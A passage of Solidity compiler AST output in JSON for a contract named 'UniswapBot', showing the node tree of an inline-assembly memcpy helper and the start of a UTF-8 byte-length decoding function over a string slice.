									"visibility": "internal"
								},
								{
									"body": {
										"id": 1062,
										"nodeType": "Block",
										"src": "5730:493:9",
										"statements": [
											{
												"body": {
													"id": 1048,
													"nodeType": "Block",
													"src": "5807:142:9",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "5831:58:9",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"name": "dest",
																					"nodeType": "YulIdentifier",
																					"src": "5857:4:9"
																				},
																				{
																					"arguments": [
																						{
																							"name": "src",
																							"nodeType": "YulIdentifier",
																							"src": "5869:3:9"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "5863:5:9"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "5863:10:9"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "5850:6:9"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "5850:24:9"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "5850:24:9"
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1025,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5857:4:9",
																	"valueSize": 1
																},
																{
																	"declaration": 1027,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "5869:3:9",
																	"valueSize": 1
																}
															],
															"id": 1039,
															"nodeType": "InlineAssembly",
															"src": "5822:67:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1042,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1040,
																	"name": "dest",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1025,
																	"src": "5903:4:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1041,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5911:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5903:10:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1043,
															"nodeType": "ExpressionStatement",
															"src": "5903:10:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1046,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1044,
																	"name": "src",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1027,
																	"src": "5928:3:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1045,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5935:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "5928:9:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1047,
															"nodeType": "ExpressionStatement",
															"src": "5928:9:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1034,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1032,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1029,
														"src": "5785:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3332",
														"id": 1033,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5792:2:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_32_by_1",
															"typeString": "int_const 32"
														},
														"value": "32"
													},
													"src": "5785:9:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1049,
												"initializationExpression": null,
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1037,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1035,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1029,
															"src": "5796:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "-=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 1036,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5803:2:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "5796:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1038,
													"nodeType": "ExpressionStatement",
													"src": "5796:9:9"
												},
												"nodeType": "ForStatement",
												"src": "5779:170:9"
											},
											{
												"assignments": [
													1051
												],
												"declarations": [
													{
														"constant": false,
														"id": 1051,
														"mutability": "mutable",
														"name": "mask",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1062,
														"src": "5995:9:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1050,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5995:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1060,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1059,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1057,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "323536",
															"id": 1052,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6007:3:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_256_by_1",
																"typeString": "int_const 256"
															},
															"value": "256"
														},
														"nodeType": "BinaryOperation",
														"operator": "**",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1055,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"hexValue": "3332",
																		"id": 1053,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6015:2:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_32_by_1",
																			"typeString": "int_const 32"
																		},
																		"value": "32"
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1054,
																		"name": "len",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1029,
																		"src": "6020:3:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6015:8:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 1056,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "6014:10:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "6007:17:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1058,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6027:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "6007:21:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5995:33:9"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6048:168:9",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "6063:41:9",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "src",
																				"nodeType": "YulIdentifier",
																				"src": "6088:3:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6082:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6082:10:9"
																	},
																	{
																		"arguments": [
																			{
																				"name": "mask",
																				"nodeType": "YulIdentifier",
																				"src": "6098:4:9"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "6094:3:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6094:9:9"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "6078:3:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "6078:26:9"
															},
															"variables": [
																{
																	"name": "srcpart",
																	"nodeType": "YulTypedName",
																	"src": "6067:7:9",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "6118:38:9",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dest",
																				"nodeType": "YulIdentifier",
																				"src": "6144:4:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6138:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6138:11:9"
																	},
																	{
																		"name": "mask",
																		"nodeType": "YulIdentifier",
																		"src": "6151:4:9"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "6134:3:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "6134:22:9"
															},
															"variables": [
																{
																	"name": "destpart",
																	"nodeType": "YulTypedName",
																	"src": "6122:8:9",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dest",
																		"nodeType": "YulIdentifier",
																		"src": "6177:4:9"
																	},
																	{
																		"arguments": [
																			{
																				"name": "destpart",
																				"nodeType": "YulIdentifier",
																				"src": "6186:8:9"
																			},
																			{
																				"name": "srcpart",
																				"nodeType": "YulIdentifier",
																				"src": "6196:7:9"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "6183:2:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6183:21:9"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "6170:6:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "6170:35:9"
															},
															"nodeType": "YulExpressionStatement",
															"src": "6170:35:9"
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 1025,
														"isOffset": false,
														"isSlot": false,
														"src": "6144:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1025,
														"isOffset": false,
														"isSlot": false,
														"src": "6177:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1051,
														"isOffset": false,
														"isSlot": false,
														"src": "6098:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1051,
														"isOffset": false,
														"isSlot": false,
														"src": "6151:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1027,
														"isOffset": false,
														"isSlot": false,
														"src": "6088:3:9",
														"valueSize": 1
													}
												],
												"id": 1061,
												"nodeType": "InlineAssembly",
												"src": "6039:177:9"
											}
										]
									},
									"documentation": null,
									"id": 1063,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "memcpy",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1030,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1025,
												"mutability": "mutable",
												"name": "dest",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1063,
												"src": "5686:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1024,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5686:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1027,
												"mutability": "mutable",
												"name": "src",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1063,
												"src": "5697:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1026,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5697:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1029,
												"mutability": "mutable",
												"name": "len",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1063,
												"src": "5707:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1028,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5707:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5685:31:9"
									},
									"returnParameters": {
										"id": 1031,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5730:0:9"
									},
									"scope": 2159,
									"src": "5670:553:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1209,
										"nodeType": "Block",
										"src": "6499:1060:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1073,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1070,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1065,
															"src": "6514:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1071,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "6514:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1072,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6527:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6514:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1077,
												"nodeType": "IfStatement",
												"src": "6510:55:9",
												"trueBody": {
													"id": 1076,
													"nodeType": "Block",
													"src": "6530:35:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1074,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6552:1:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 1069,
															"id": 1075,
															"nodeType": "Return",
															"src": "6545:8:9"
														}
													]
												}
											},
											{
												"assignments": [
													1079
												],
												"declarations": [
													{
														"constant": false,
														"id": 1079,
														"mutability": "mutable",
														"name": "word",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1209,
														"src": "6578:9:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1078,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6578:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1080,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6578:9:9"
											},
											{
												"assignments": [
													1082
												],
												"declarations": [
													{
														"constant": false,
														"id": 1082,
														"mutability": "mutable",
														"name": "length",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1209,
														"src": "6598:11:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1081,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6598:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1083,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6598:11:9"
											},
											{
												"assignments": [
													1085
												],
												"declarations": [
													{
														"constant": false,
														"id": 1085,
														"mutability": "mutable",
														"name": "divisor",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1209,
														"src": "6620:12:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1084,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6620:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1089,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													},
													"id": 1088,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 1086,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6635:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "BinaryOperation",
													"operator": "**",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "323438",
														"id": 1087,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6640:3:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_248_by_1",
															"typeString": "int_const 248"
														},
														"value": "248"
													},
													"src": "6635:8:9",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6620:23:9"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6711:38:9",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "6713:34:9",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "6736:4:9"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "6742:2:9",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "6732:3:9"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "6732:13:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6726:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6726:20:9"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "6720:5:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "6720:27:9"
															},
															"variableNames": [
																{
																	"name": "word",
																	"nodeType": "YulIdentifier",
																	"src": "6713:4:9"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 1065,
														"isOffset": false,
														"isSlot": false,
														"src": "6736:4:9",
														"valueSize": 1
													},
													{
														"declaration": 1079,
														"isOffset": false,
														"isSlot": false,
														"src": "6713:4:9",
														"valueSize": 1
													}
												],
												"id": 1090,
												"nodeType": "InlineAssembly",
												"src": "6702:47:9"
											},
											{
												"assignments": [
													1092
												],
												"declarations": [
													{
														"constant": false,
														"id": 1092,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1209,
														"src": "6759:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1091,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6759:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1096,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1095,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1093,
														"name": "word",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1079,
														"src": "6768:4:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1094,
														"name": "divisor",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1085,
														"src": "6775:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6768:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6759:23:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1099,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1097,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1092,
														"src": "6797:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 1098,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6801:4:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "6797:8:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1111,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1109,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1092,
															"src": "6875:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 1110,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6879:4:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "6875:8:9",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1125,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1123,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1092,
																"src": "6960:1:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 1124,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6964:4:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "6960:8:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 1147,
															"nodeType": "Block",
															"src": "7042:66:9",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 1141,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 1137,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1068,
																			"src": "7057:3:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1140,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1138,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1092,
																				"src": "7063:1:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783037",
																				"id": 1139,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7067:4:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_7_by_1",
																					"typeString": "int_const 7"
																				},
																				"value": "0x07"
																			},
																			"src": "7063:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "7057:14:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 1142,
																	"nodeType": "ExpressionStatement",
																	"src": "7057:14:9"
																},
																{
																	"expression": {
